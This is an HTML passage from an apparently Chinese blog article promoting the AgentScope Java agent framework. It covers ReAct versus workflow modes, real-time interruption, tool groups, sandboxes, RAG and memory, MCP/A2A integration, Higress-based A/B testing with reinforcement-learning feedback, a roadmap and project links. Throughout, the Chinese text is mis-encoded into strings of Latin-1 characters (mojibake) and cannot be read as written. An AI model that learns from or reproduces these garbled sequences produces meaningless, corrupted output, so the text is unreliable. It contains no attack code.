<li>å·¥ä½œæµï¼ˆWorkflowï¼‰æ¨¡å¼ï¼šåœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼ŒLLM ä¸å·¥å…·ï¼ˆToolï¼‰çš„åä½œè·¯å¾„ç”±å¼€å‘è€…é¢„å…ˆå®šä¹‰ï¼Œå¼€å‘è€…å¯¹ç³»ç»Ÿçš„æ‰§è¡Œæµç¨‹æœ‰å®Œå…¨çš„æ§åˆ¶æƒï¼Œè¿™ä¿è¯äº†ä»»åŠ¡æ‰§è¡Œçš„ç¨³å®šæ€§å’Œç¡®å®šæ€§ã€‚ä½†æ˜¯ä»–çš„ç¼ºç‚¹æ˜¯æ¶æ„åƒµåŒ–ï¼Œå½“ä¸šåŠ¡é€»è¾‘å˜å¾—å¤æ‚æ—¶ï¼Œç»´æŠ¤æˆæœ¬æ¿€å¢ï¼Œè€Œä¸”æ— æ³•äº«å— LLM æŒç»­è¿›åŒ–æ‰€å¸¦æ¥çš„èƒ½åŠ›æå‡ã€‚</li>
<li>ReAct èŒƒå¼ï¼šä¸ Workflow ç›¸åï¼ŒReAct èµ‹äºˆäº† LLM è‡ªä¸»æ§åˆ¶æƒã€‚LLM æ‰®æ¼”å¤§è„‘çš„è§’è‰²ï¼Œèƒ½å¤ŸåŠ¨æ€åœ°è¿›è¡Œæ¨ç†ï¼ˆReasoningï¼‰å’Œè§„åˆ’ï¼Œè‡ªä¸»å†³å®šä½•æ—¶ã€å¦‚ä½•è°ƒç”¨å·¥å…·æ¥æ‰§è¡Œæ“ä½œï¼ˆActionï¼‰ï¼Œä»è€Œä¸»å¯¼ä»»åŠ¡çš„å®Œæˆã€‚éšç€ LLM åœ¨ç†è§£ã€è§„åˆ’å’Œå·¥å…·ä½¿ç”¨ç­‰å…³é”®èƒ½åŠ›ä¸Šæ—¥è¶‹æˆç†Ÿï¼Œè¿™ç§é«˜åº¦è‡ªä¸»çš„ Agent æ¶æ„å·²æˆä¸ºå¤æ‚åº”ç”¨åœºæ™¯ä¸‹çš„é¦–é€‰ã€‚</li>
</ol>
</li>
<li>
<p><strong>å®æ—¶çš„ä»‹å…¥æ§åˆ¶</strong>ï¼Œè®© Agent è¿è¡Œå…¨ç¨‹å¯æ§ã€‚ä¼ ç»Ÿ Agent ä¸€æ—¦å¯åŠ¨ä¾¿æ— æ³•å®‰å…¨å¹²é¢„ï¼ŒAgentScope åŸºäºå¼‚æ­¥æ¶æ„ï¼Œå®ç°äº†å¼ºå¤§çš„å®æ—¶ä»‹å…¥æœºåˆ¶ã€‚</p>
<ol>
<li>å®‰å…¨ä¸­æ–­ï¼šæ”¯æŒéšæ—¶æš‚åœ Agentï¼Œå¹¶è‡ªåŠ¨ä¿å­˜å…¶ä¸Šä¸‹æ–‡å’Œå·¥å…·çŠ¶æ€ï¼Œç¡®ä¿ä»»åŠ¡èƒ½æ— ç¼æ¢å¤ã€‚</li>
<li>å®æ—¶æ‰“æ–­ï¼šå½“ä»»åŠ¡åç¦»é¢„æœŸæˆ–è€—æ—¶è¿‡é•¿æ—¶ï¼Œç”¨æˆ·å¯ç«‹å³ç»ˆæ­¢ï¼Œé¿å…èµ„æºæµªè´¹ã€‚</li>
<li>çµæ´»å®šåˆ¶ï¼šå¼€å‘è€…å¯ä»¥è‡ªå®šä¹‰ä¸­æ–­å¤„ç†é€»è¾‘ï¼Œå®ç°æ›´ç²¾ç»†åŒ–çš„ç®¡ç†ã€‚</li>
</ol>
</li>
<li>
<p><strong>é«˜æ•ˆçš„å·¥å…·è°ƒç”¨</strong>ï¼Œéšç€å¯è°ƒç”¨å·¥å…·æ•°é‡çš„æ¿€å¢ï¼ŒAgent é¢ä¸´ç€å·¥å…·ç®¡ç†å¤æ‚ã€æ‰§è¡Œæ•ˆç‡ä½ã€ä¸Šä¸‹æ–‡ç´§å¼ çš„é—®é¢˜ã€‚AgentScope æ„å»ºäº†ä¸€å¥—é«˜æ•ˆã€å¯é çš„å·¥å…·ç®¡ç†ä½“ç³»ã€‚</p>
<ol>
<li>å·¥å…·æ³¨å†Œï¼šæä¾›æ ‡å‡†åŒ–çš„æ³¨å†Œæ¥å£ï¼Œæ”¯æŒè‡ªåŠ¨æå–å·¥å…·çš„ JSON Schemaï¼Œæä¾›å‚æ•°é¢„è®¾å’Œå·¥å…·å‡½æ•°åå¤„ç†æ¥å£ï¼Œé™ä½é›†æˆé—¨æ§›ã€‚</li>
<li>ä¾¿æ·ç®¡ç†ï¼šAgentScope é€šè¿‡ç»“æ„åŒ–çš„ç»„ç»‡æ–¹å¼å’ŒåŠ¨æ€æ§åˆ¶æœºåˆ¶æ¥é«˜æ•ˆæ”¯æŒå·¥å…·çš„ä½¿ç”¨ã€‚å·¥å…·ç»„ï¼ˆTool Groupï¼‰æŒ‰ç…§åŠŸèƒ½å¯¹å·¥å…·è¿›è¡Œåˆ†ç±»ï¼ˆä¾‹å¦‚æµè§ˆå™¨ã€åœ°å›¾æœåŠ¡ç­‰ï¼‰ï¼Œä½¿ Agent èƒ½å¤Ÿæ ¹æ®å½“å‰ä»»åŠ¡æŒ‰éœ€æ¿€æ´»ç›¸å…³å·¥å…·ï¼Œä»è€Œæœ‰æ•ˆç¼“è§£ä¸Šä¸‹æ–‡çª—å£çš„å‹åŠ›ï¼›å…ƒå·¥å…·ï¼ˆMeta-Toolï¼‰å…è®¸ Agent åœ¨è¿è¡Œæ—¶åŠ¨æ€å¯ç”¨æˆ–åœç”¨æ•´ä¸ªå·¥å…·ç»„ï¼Œå®ç°æ›´åŠ æ™ºèƒ½åŒ–çš„å·¥å…·ç®¡ç†ã€‚</li>
<li>é«˜æ•ˆæ‰§è¡Œï¼šé‡‡ç”¨ç»Ÿä¸€æ¥å£å¤„ç†æ‰€æœ‰å·¥å…·è°ƒç”¨ï¼Œæ— è®ºåŒæ­¥ã€å¼‚æ­¥æˆ–æµå¼è¾“å‡ºï¼Œåœ¨ AgentScope ä¸­å°†è¢«ç»Ÿä¸€ä¸ºå¼‚æ­¥æµå¼è¿”å›ï¼Œé™ä½å·¥å…·å‡½æ•°è¿”å›çš„å¤„ç†å¤æ‚åº¦ã€‚åŒæ—¶æ”¯æŒå·¥å…·çš„å¹¶è¡Œè°ƒç”¨ï¼Œå¤§å¹…æå‡è¿è¡Œæ•ˆç‡ã€‚</li>
</ol>
</li>
<li>
<p><strong>å¼ºå¤§çš„å†…ç½®å·¥å…·</strong>ï¼šAgentScope å†…ç½®äº†è®¸å¤šå¼€ç®±å³ç”¨çš„å¼ºå¤§å·¥å…·ï¼Œå¼€ç®±å³ç”¨ï¼ŒåŠ é€Ÿç”Ÿäº§çº§åº”ç”¨å¼€å‘ã€‚</p>
<ol>
<li>PlanNoteBook å·¥å…·æä¾›äº†å¼ºå¤§çš„ä»»åŠ¡è§„åˆ’ä¸æ‰§è¡Œèƒ½åŠ›ã€‚æ”¯æŒå¼€å‘è€…æ‰‹åŠ¨å®šä¹‰ç»“æ„åŒ–è®¡åˆ’ï¼Œä¹Ÿå…è®¸ Agent åœ¨è¿è¡Œæ—¶è‡ªä¸»åˆ›å»ºå’Œç®¡ç†è®¡åˆ’ã€‚é€šè¿‡ PlanNotebook æä¾›å®Œæ•´çš„è®¡åˆ’ç®¡ç†åŠŸèƒ½ï¼ŒåŒ…æ‹¬åˆ›å»ºã€ä¿®æ”¹ã€æš‚åœã€æ¢å¤å’Œåˆ‡æ¢å¤šä¸ªè®¡åˆ’ï¼Œå¼•å¯¼ Agent æœ‰åºæ‰§è¡Œå¤æ‚è®¡åˆ’ã€‚</li>
<li>ç»“æ„åŒ–è¾“å‡ºï¼šä¼ ç»Ÿçš„åšæ³•æ˜¯åœ¨ Prompt ä¸­å†™æ ¼å¼è¦æ±‚ï¼Œè¦æ±‚æ¨¡å‹â€œè¯·æŒ‰ç…§ä»¥ä¸‹ JSON æ ¼å¼è¾“å‡ºâ€ï¼Œä¸æ–­å°è¯•å’Œä¼˜åŒ–æç¤ºè¯ï¼Œç»å¸¸éœ€è¦åœ¨å¤–éƒ¨ä»£ç ä¸­åšäºŒæ¬¡è§£æå’Œæ ¼å¼æ ¡éªŒã€‚AgentScope é€šè¿‡å†…ç½®å·¥å…·ç¡®ä¿ LLM çš„è¾“å‡ºä¸¥æ ¼éµå¾ªé¢„å®šä¹‰çš„ JSON æ ¼å¼ï¼Œå½»åº•å‘Šåˆ«ç¹ççš„æç¤ºè¯è°ƒè¯•å’ŒäºŒæ¬¡è§£æã€‚</li>
</ol>
</li>
</ol>
<h3 data-id="heading-3">ä¼ä¸šçº§èƒ½åŠ›</h3>
<p>AgentScope æä¾›äº†å®‰å…¨å·¥å…·æ²™ç®±å’Œä¸Šä¸‹æ–‡å·¥ç¨‹èƒ½åŠ›ï¼Œè§£å†³äº†å®‰å…¨ä¸æ•ˆæœçš„æ ¸å¿ƒç—›ç‚¹ï¼Œç¡®ä¿ Agent çš„è¾“å‡ºæ•ˆæœæ»¡è¶³ç”Ÿäº§æ ‡å‡†ã€‚ä¾æ‰˜äº Java åœ¨ä¼ä¸šåº”ç”¨å¼€å‘å¸‚åœºçš„å¼ºå¤§ç”Ÿæ€ï¼Œé€šè¿‡æ ‡å‡†çš„ A2A å’Œ MCP åè®®ï¼Œæä¾›äº†çµæ´»çš„é›†æˆä¸è¢«é›†æˆæ–¹æ¡ˆï¼Œè¿™ä½¿å¾— Agent æ—¢èƒ½ä½œä¸ºç‹¬ç«‹æœåŠ¡åµŒå…¥ç°æœ‰ç³»ç»Ÿï¼Œä¹Ÿèƒ½æˆä¸ºè¿æ¥å’Œè°ƒåº¦å…¶ä»–æœåŠ¡çš„æ™ºèƒ½ä¸­æ¢ã€‚å¼€å‘è€…æ— éœ€å…³å¿ƒåº•å±‚é›†æˆç»†èŠ‚ï¼Œä¸“æ³¨äºä¸šåŠ¡é€»è¾‘å³å¯å¿«é€Ÿæ„å»ºç”Ÿäº§çº§ Agent åº”ç”¨ã€‚æœ€åï¼Œä¾æ‰˜äº AgentScope Runtime æä¾›çš„èƒ½åŠ›ï¼Œæ”¯æŒå°† Agent ä¸€é”®éƒ¨ç½²åˆ°é˜¿é‡Œäº‘ç™¾ç‚¼å’Œå‡½æ•°è®¡ç®—å¹³å°ï¼Œä¸ºæ‚¨çš„ Agent åº”ç”¨æä¾›å•†ä¸šçº§çš„äº§å“åŒ–ä¿éšœã€‚</p>
<ol>
<li>
<p><strong>å®‰å…¨æ²™ç®±</strong></p>
<ol>
<li>Agent åœ¨æ‰§è¡Œå·¥å…·è°ƒç”¨æˆ–è‡ªåŠ¨åŒ–ä»»åŠ¡æ—¶ï¼Œå¯èƒ½è®¿é—®æ•æ„Ÿèµ„æºæˆ–å¼•å‘ä¸å¯æ§è¡Œä¸ºï¼Œéœ€è¦æ²™ç®±æä¾›å®‰å…¨éš”ç¦»ç¯å¢ƒã€‚AgentScope Runtime Sandbox æ”¯æŒå¼€å‘è€…å°†è‡ªå®šä¹‰å·¥å…·éƒ¨ç½²åœ¨é«˜åº¦éš”ç¦»çš„å—æ§ç¯å¢ƒä¸­å®‰å…¨è¿è¡Œï¼Œé˜²æ­¢å¯¹ç³»ç»Ÿé€ æˆæ„å¤–å½±å“æˆ–å®‰å…¨é£é™©ã€‚</li>
<li>å†…ç½®å¤šç§å¼€ç®±å³ç”¨çš„æ²™ç®±ï¼šGUI æ²™ç®±æä¾›å®Œæ•´æ¡Œé¢ç¯å¢ƒï¼Œæ”¯æŒé¼ æ ‡ã€é”®ç›˜å’Œå±å¹•æ“ä½œï¼›æ–‡ä»¶ç³»ç»Ÿæ²™ç®±å®ç°éš”ç¦»çš„æ–‡ä»¶è¯»å†™ä¸ç®¡ç†ï¼›ç§»åŠ¨ç«¯æ²™ç®±åŸºäº Android æ¨¡æ‹Ÿå™¨ï¼Œæ”¯æŒç‚¹å‡»ã€æ»‘åŠ¨ã€è¾“å…¥å’Œæˆªå±ç­‰çœŸå®ç§»åŠ¨äº¤äº’ã€‚å…¼é¡¾äº†å®‰å…¨æ€§ã€çµæ´»æ€§ä¸å¤šå¹³å°è¦†ç›–ï¼Œå…¨é¢æ”¯æ’‘å·¥å…·æ‰§è¡Œã€æµè§ˆå™¨è‡ªåŠ¨åŒ–ã€è®­ç»ƒè¯„æµ‹ç­‰å¤æ‚åœºæ™¯ã€‚</li>
</ol>
</li>
<li>
<p><strong>ä¸Šä¸‹æ–‡å·¥ç¨‹</strong></p>
<ol>
<li>RAGï¼šå†…ç½®åŸºäº Embedding çš„æ ‡å‡†å®ç°ï¼Œæ”¯æŒä¼ä¸šåœ¨é¢å¯¹å¤æ‚çš„å¤šå…ƒä¸šåŠ¡æ•°æ®æƒ…å†µä¸‹ï¼Œç§æœ‰åŒ–éƒ¨ç½²è‡ªæœ‰çš„çŸ¥è¯†åº“ä½“ç³»ï¼Œå®ç°å¯¹æ•°æ®çš„å®Œå…¨è‡ªä¸»å¯æ§ï¼›é›†æˆé˜¿é‡Œäº‘ç™¾ç‚¼ä¼ä¸šçº§çŸ¥è¯†åº“ï¼Œå€ŸåŠ©å•†ä¸šåŒ–äº§å“è·å¾—æ›´å¼ºå¤§çš„æ£€ç´¢ä¸é‡æ’åºèƒ½åŠ›ã€‚</li>
<li>Memoryï¼šAgentScope å®šä¹‰äº†å¯¹çŸ­æœŸã€é•¿æœŸè®°å¿†çš„æŠ½è±¡ï¼Œæ”¯æŒè¯­ä¹‰æœç´¢ä¸å¤šç§Ÿæˆ·éš”ç¦»ï¼Œæä¾›è‡ªåŠ¨ç®¡ç†ã€Agent ä¸»åŠ¨è°ƒç”¨ã€æ··åˆæ¨¡å¼ä¸‰ç§æ§åˆ¶æ–¹å¼ã€‚é€šè¿‡ ReMe é¡¹ç›®æä¾›äº†è®°å¿†çš„æœ€ä½³å®è·µæ–¹æ¡ˆï¼Œè®© Agent èƒ½å¤Ÿç†è§£ç”¨æˆ·åå¥½ã€æå‡ä»»åŠ¡è¡¨ç°å’Œæ›´èªæ˜åœ°ä½¿ç”¨å·¥å…·ï¼Œæ˜¾è‘—æå‡ä¸šåŠ¡åœºæ™¯ä¸‹çš„æ™ºèƒ½é—®ç­”å‡†ç¡®æ€§ä¸ä¸Šä¸‹æ–‡è¿è´¯æ€§ï¼Œå®ç°è¶Šç”¨è¶Šå¥½ç”¨ã€‚</li>
</ol>
</li>
<li>
<p><strong>æ˜“äºé›†æˆ</strong></p>
<ol>
<li>MCP é›†æˆï¼šåŸºäº AgentScope Java å¼€æºç”Ÿæ€ï¼Œç°æœ‰çš„ HTTP ä¸šåŠ¡ç³»ç»Ÿæ— éœ€æ”¹åŠ¨ä¸šåŠ¡é€»è¾‘ä»£ç ï¼Œé€šè¿‡ç®€å•é…ç½®å³å¯è¢« Agent æ— ç¼é›†æˆï¼Œå¿«é€Ÿæˆä¸º Agent å¯è°ƒç”¨çš„â€œæ‰‹è„šâ€ï¼Œæå¤§åœ°æ‰©å±•äº† Agent çš„èƒ½åŠ›è¾¹ç•Œã€‚</li>
<li>A2A é›†æˆï¼šå¤æ‚çš„ä»»åŠ¡é€šå¸¸éœ€è¦å¤šä¸ª Agent ååŒå·¥ä½œã€‚AgentScope Java æ”¯æŒå°†æè¿° Agent è‡ªèº«èƒ½åŠ›çš„ Agent Card æ³¨å†Œåˆ° Nacos ç­‰æœåŠ¡ä¸­å¿ƒï¼Œè°ƒç”¨æ–¹ Agent åªéœ€è¿æ¥ Nacosï¼Œå³å¯è‡ªåŠ¨å‘ç°å¹¶è°ƒç”¨å…¶ä»– Agent çš„èƒ½åŠ›ã€‚è¿™ä½¿å¾—åˆ†å¸ƒå¼ Multi Agent ç³»ç»Ÿçš„æ„å»ºä¸åä½œå˜å¾—åƒè°ƒç”¨æ™®é€šå¾®æœåŠ¡ä¸€æ ·ç®€å•ã€‚</li>
</ol>
</li>
<li>
<p>é«˜æ€§èƒ½</p>
<ol>
<li>è½»é‡åŒ–ï¼šæ ¸å¿ƒåº“ä»…ä¾èµ– Reactor Coreã€Jackson å’Œ SLF4Jã€RAGã€é•¿æœŸè®°å¿†ç­‰èƒ½åŠ›é€šè¿‡å¯é€‰æ‰©å±•æŒ‰éœ€å¼•å…¥ï¼Œç›®å‰åŸºäºå‚å•†åŸç”Ÿ SDK å®ç°æ¨¡å‹è°ƒç”¨ï¼Œæœªæ¥å°†åŸºäº OkHttp ä¸ Jackson åŸç”Ÿå®ç°ï¼Œè¿›ä¸€æ­¥ç²¾ç®€å†…æ ¸ä¾èµ–ã€‚</li>
<li>å¼‚æ­¥åŒ–ï¼šé’ˆå¯¹ AI åº”ç”¨äº¤äº’å…·æœ‰æŒç»­æ—¶é—´é•¿ã€å¤šè½®æ¬¡ä¸Šä¸‹æ–‡ä¾èµ–çš„ç‰¹ç‚¹ï¼Œæ”¯æŒå¼•å…¥æ¶ˆæ¯é˜Ÿåˆ— RocketMQ ä½œä¸ºå¼‚æ­¥æ¶ˆæ¯ä¸­æ¢ï¼Œå®ç°ä»»åŠ¡è§£è€¦ä¸éé˜»å¡è°ƒç”¨ï¼Œæå‡ Agent çš„ååèƒ½åŠ›å’Œå“åº”é€Ÿåº¦ã€‚</li>
<li>Native ä¼˜åŒ–ï¼šè”åˆ JVM å›¢é˜Ÿé€‚é…äº† GraalVM å’Œ Leydenï¼Œå°† Java åº”ç”¨å¯åŠ¨é€Ÿåº¦æå‡ 3 åˆ° 10 å€ï¼Œå®ç°äº† Agent 200ms å†…å†·å¯åŠ¨ï¼Œä¸º AI åº”ç”¨ Serverless æ¯«ç§’çº§å¼¹æ€§å¥ å®šåŸºç¡€ã€‚</li>
</ol>
</li>
</ol>
<h3 data-id="heading-4">å¼ºå¤§çš„ç”Ÿæ€</h3>
<p>AI åŸç”Ÿåº”ç”¨æ¶æ„æ­£åœ¨æ·±åˆ»é‡å¡‘è½¯ä»¶å·¥ç¨‹èŒƒå¼ï¼Œä¼ ç»Ÿè½¯ä»¶çš„ç¡®å®šæ€§è¢« Agent çš„éç¡®å®šæ€§æ‰€å–ä»£ï¼Œå…¶æœ€ç»ˆæ•ˆæœç”±æ¨¡å‹ã€æ•°æ®å’Œä¸Šä¸‹æ–‡å…±åŒå†³å®šï¼Œè¿™ä½¿å¾—ä¼ ç»Ÿçš„â€œä»£ç æµ‹è¯•â€æ¼”å˜ä¸ºå¤æ‚çš„â€œæ•ˆæœè¯„ä¼°â€ã€‚ç”±äºä»»ä½•å¾®å°çš„å˜æ›´éƒ½å¯èƒ½å¼•å‘æ•ˆæœçš„å‰§çƒˆæ³¢åŠ¨ï¼ŒA/B æµ‹è¯•å·²ä»è¿‡å»çš„ä¼˜åŒ–é€‰é¡¹ï¼Œè½¬å˜ä¸ºä¿éšœç‰ˆæœ¬è´¨é‡çš„æ ¸å¿ƒå‘å¸ƒæµç¨‹ã€‚è½¯ä»¶å·¥ç¨‹é‡å¿ƒä¹Ÿå¿…é¡»ä»ä»¥ä»£ç ä¸ºä¸­å¿ƒè½¬å‘ä»¥æ•°æ®ä¸ºä¸­å¿ƒï¼ŒæˆåŠŸçš„å…³é”®åœ¨äºæ„å»ºä¸€ä¸ªé«˜æ•ˆçš„æ•°æ®é£è½®ã€‚</p>
<p>é¢å¯¹è¿™ä¸€æŒ‘æˆ˜ï¼ŒAgentScope æä¾›äº† Studioã€RM Gallery å’Œ Trinity-RFT ç­‰ä¸€ç³»åˆ—ç”Ÿæ€å·¥å…·ï¼Œç»“åˆ Higress AI ç½‘å…³å’Œå¯è§‚æµ‹ç³»ç»Ÿï¼Œæ‚¨å¯ä»¥å¿«é€Ÿå®è·µ AI åŸç”Ÿåº”ç”¨æ•°æ®é£è½®ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/869488f900334ff785218cf8991ba100~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766396803&amp;x-signature=NGCD4iN%2FPsiVCl4yld8V4v15CrU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åœ¨ Agent å¼€å‘é˜¶æ®µï¼Œæˆ‘ä»¬é‡‡ç”¨ AgentScope Studio å¯è§†åŒ–å¹³å°å¯¹ Agent è¿›è¡Œå®æ—¶è°ƒè¯•ä¸è§‚æµ‹ï¼Œæ˜¾è‘—æå‡äº†å¼€å‘æ•ˆç‡ï¼Œå®ƒæ·±åº¦é›†æˆäº† OpenTelemetry å’Œ LoongSuiteï¼Œå®ç°äº†ç«¯åˆ°ç«¯çš„å…¨é“¾è·¯è¿½è¸ªã€‚</p>
<p>åœ¨éƒ¨ç½²æ¶æ„ä¸­ï¼ŒHigress ä½œä¸ºç»Ÿä¸€çš„æµé‡å…¥å£ç½‘å…³ï¼Œè´Ÿè´£å°†å¤–éƒ¨è¯·æ±‚è·¯ç”±è‡³ç›¸åº”çš„ Agentã€‚Agent åˆ™é€šè¿‡ Higress å†…ç½®çš„ AI ç½‘å…³èƒ½åŠ›ä¸ LLM é€šä¿¡ã€‚å€ŸåŠ© Higress å¼ºå¤§çš„æ’ä»¶ä½“ç³»ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹æµé‡è¿›è¡Œçµæ´»æ‰“æ ‡ï¼Œä»è€Œå®ç°å¯¹ Agent å’Œ LLM çš„ç²¾å‡†è·¯ç”±æ§åˆ¶ã€‚</p>
<p>åœ¨å‘å¸ƒåçš„ A/B æµ‹è¯•é˜¶æ®µï¼ŒHigress ç½‘å…³èƒ½æ ¹æ®è¯·æ±‚å†…å®¹ï¼ˆå¦‚ç”¨æˆ·åœ°ç†ä½ç½®ã€ä¸šåŠ¡çº¿ã€ä»˜è´¹çŠ¶æ€ç­‰ï¼‰å°†æµé‡åˆ†é…åˆ°ä¸åŒå®éªŒç»„ã€‚ä¾‹å¦‚ï¼Œå°†ä»˜è´¹ç”¨æˆ·å¯¼å‘ Agent çš„ A ç‰ˆæœ¬ï¼Œå…è´¹ç”¨æˆ·å¯¼å‘ B ç‰ˆæœ¬ï¼Œä»¥è¿›è¡Œæ•ˆæœå¯¹æ¯”ã€‚åŒæ—¶æµé‡çš„åˆ†ç»„æ ‡ç­¾ä¼šå€ŸåŠ©å¯è§‚æµ‹åœ¨æ•´ä¸ªè°ƒç”¨é“¾è·¯ä¸­é€ä¼ ã€‚è¿™æ ·ï¼ŒAI ç½‘å…³ä¾¿èƒ½æ ¹æ®æ­¤æ ‡ç­¾å°†è¯·æ±‚è·¯ç”±åˆ°å¯¹åº”çš„ LLM ç‰ˆæœ¬ã€‚è¿™ä¸€æœºåˆ¶è®©æˆ‘ä»¬åœ¨æ— éœ€ä¿®æ”¹ä¸šåŠ¡ä»£ç çš„æƒ…å†µä¸‹ï¼Œå®ç°äº† Agent ä¸ LLM çš„ååŒ A/B æµ‹è¯•ã€‚</p>
<p>åœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œå…¨é“¾è·¯äº§ç”Ÿçš„æ‰€æœ‰æ•°æ®â€”â€”ä»ç”¨æˆ·è¾“å…¥ã€Agent çš„æç¤ºè¯ï¼ˆPromptï¼‰ï¼Œåˆ°æ¨¡å‹çš„è¾“å‡ºã€æ—¶å»¶ä¸æˆæœ¬éƒ½ä¼šä¸ŠæŠ¥åˆ°å¯è§‚æµ‹ç³»ç»Ÿä¸­ã€‚åŸºäº RM Gallery çš„å¥–åŠ±å‡½æ•°è¯„ä¼° Agent åœ¨å„å®éªŒç»„çš„ä¸šåŠ¡è¡¨ç°ï¼Œå¹¶ç­›é€‰æ²‰æ·€é«˜è´¨é‡çš„æ•°æ®é›†ã€‚éšåï¼Œæˆ‘ä»¬çš„è®­ç»ƒæ¡†æ¶ Trinity-RFT ä¼šè¿ç”¨è¿™äº›æ•°æ®é›†å’Œå¥–åŠ±æ¨¡å‹ï¼Œé€šè¿‡å¼ºåŒ–å­¦ä¹ å¯¹æ¨¡å‹è¿›è¡ŒæŒç»­è¿­ä»£ï¼Œä¸æ–­æå‡å…¶è§£å†³ä¸šåŠ¡é—®é¢˜çš„èƒ½åŠ›ã€‚</p>
<p>æœ€ç»ˆï¼Œè¿™å½¢æˆäº†ä¸€ä¸ªä»¥æ•°æ®ä¸ºé©±åŠ¨çš„è‡ªæˆ‘ä¼˜åŒ–é—­ç¯ã€‚ç³»ç»Ÿé€šè¿‡æŒç»­é‡‡é›†çº¿ä¸ŠçœŸå®æ•°æ®ã€åˆ†æè¯„ä¼°æ•ˆæœå¹¶è½¬åŒ–ä¸ºé«˜è´¨é‡çš„è®­ç»ƒæ•°æ®ï¼Œä¸æ–­å¢å¼ºæ¨¡å‹èƒ½åŠ›ï¼Œæ„ç­‘èµ·åšå®çš„æŠ€æœ¯ç«äº‰å£å’ã€‚</p>
<h2 data-id="heading-5">AgentScope Java Roadmap</h2>
<ul>
<li>ä¸Šä¸‹æ–‡å·¥ç¨‹æŒç»­ä¼˜åŒ–ï¼šAgent æ•ˆæœä¸å¤Ÿå¥½çš„åŸå› ï¼Œè¦ä¹ˆæ˜¯æ¨¡å‹èƒ½åŠ›ä¸å¤Ÿå¼ºï¼Œè¦ä¹ˆæ˜¯æä¾›çš„ä¸Šä¸‹æ–‡ä¸å‡†ç¡®ï¼Œä¸Šä¸‹æ–‡å·¥ç¨‹æ˜¯å·¥ç¨‹èƒ½åŠ›çš„æ ¸å¿ƒã€‚AgentScope Java ä¼šæŒç»­æ·±è€•ä¸Šä¸‹æ–‡å·¥ç¨‹ï¼Œè‡´åŠ›äºæ„å»ºä¸€ä¸ªæ›´åŠ é«˜æ•ˆã€ä½å»¶è¿Ÿçš„ä¸Šä¸‹æ–‡ç®¡ç†ç³»ç»Ÿã€‚æœªæ¥å¼€å‘è€…ä¸éœ€è¦å…³å¿ƒä¸Šä¸‹æ–‡çš„æŠ€æœ¯ç»†èŠ‚ï¼Œåªéœ€è¦ä¸“æ³¨äºå®šä¹‰å¥½ Agent çš„åŠŸèƒ½ã€‚</li>
<li>å®æ—¶å…¨æ¨¡æ€æ”¯æŒï¼šå¤§æ¨¡å‹çš„è¾¹ç•Œæ­£åœ¨ä»æ–‡æœ¬æ‰©å±•è‡³å›¾åƒã€è¯­éŸ³ä¹ƒè‡³è§†é¢‘ï¼Œèƒ½å¤Ÿä¸ç‰©ç†ä¸–ç•Œäº’åŠ¨çš„å…·èº«æ™ºèƒ½äº§å“å¼€å§‹è¿›å…¥æˆ‘ä»¬çš„ç”Ÿæ´»ï¼ŒAgentScope Java ä¼šæ„å»ºå¯¹å®æ—¶å…¨æ¨¡æ€çš„æ·±åº¦æ”¯æŒï¼Œå¸®åŠ©å¼€å‘è€…æ›´å¥½åœ°å¼€å‘å¤šæ¨¡æ€çš„åº”ç”¨ï¼Œæœªæ¥ Agent ä¸åªæ˜¯æ–‡æœ¬è¾“å…¥ï¼Œå®Œå…¨å¯ä»¥é€šè¿‡â€œçœ¼ç›â€ã€â€œè€³æœµâ€å’Œâ€œæ‰‹â€æ›´å¥½åœ°æœåŠ¡ç”¨æˆ·ã€‚</li>
<li>è¯„ä¼°ä¸å¼ºåŒ–å­¦ä¹ ä¼˜åŒ–ï¼šæˆ‘ä»¬å·²ç»æä¾›äº†è§‚æµ‹ã€è¯„ä¼°ã€ä¼˜åŒ–çš„æ•´ä½“è§£å†³æ–¹æ¡ˆï¼Œä½†ç›®å‰è¯„ä¼°å’Œå¼ºåŒ–å­¦ä¹ çš„é—¨æ§›ä»æ—§æ¯”è¾ƒé«˜ã€‚åç»­ä¼šä¸æ–­é€šè¿‡ç”Ÿæ€é›†æˆé™ä½é—¨æ§›ï¼Œå¼€å‘è€…åªéœ€ç¼–å†™ä¸šåŠ¡é€»è¾‘ä¸è®¾è®¡å¥–åŠ±å‡½æ•°ï¼Œå³å¯å€ŸåŠ© AgentScope çš„ç”Ÿæ€å·¥å…·é“¾ï¼Œè®© Agent åœ¨ä¸ç”¨æˆ·æˆ–ç¯å¢ƒçš„äº¤äº’ä¸­ä¸æ–­è¿›åŒ–ï¼Œå®ç°çœŸæ­£çš„è‡ªæˆ‘æˆé•¿ä¸è¿­ä»£ã€‚</li>
</ul>
<p>AgentScope Java ç‰ˆ Github åœ°å€ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagentscope-ai%2Fagentscope-java" target="_blank" title="https://github.com/agentscope-ai/agentscope-java" ref="nofollow noopener noreferrer">github.com/agentscope-â€¦</a></p>
<p>å¸®åŠ©æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fjava.agentscope.io%2Fen%2Fintro.html" target="_blank" title="https://java.agentscope.io/en/intro.html" ref="nofollow noopener noreferrer">java.agentscope.io/en/intro.htâ€¦</a></p>
<p>å¦‚æœä½ è§‰å¾— AgentScope Java ä¸é”™ï¼Œæ¬¢è¿ç»™æˆ‘ä»¬çš„é¡¹ç›® StarÂ å¹¶åŠ å…¥æˆ‘ä»¬å¼€æºç¤¾åŒºï¼Œä¸€èµ·æ„å»ºé¢å‘æœªæ¥çš„ Agent ä½“ç³»ï¼</p>
<p>AgentScope Java å’Œ Spring AI Alibaba æœ‰å“ªäº›ä¸åŒï¼Œè¯·æŸ¥çœ‹ï¼šã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzIwODYwNTA4MA%3D%3D%26mid%3D2247486409%26idx%3D1%26sn%3Da934c815a81fec948c9e146223aab8f9%26scene%3D21%23wechat_redirect" target="_blank" 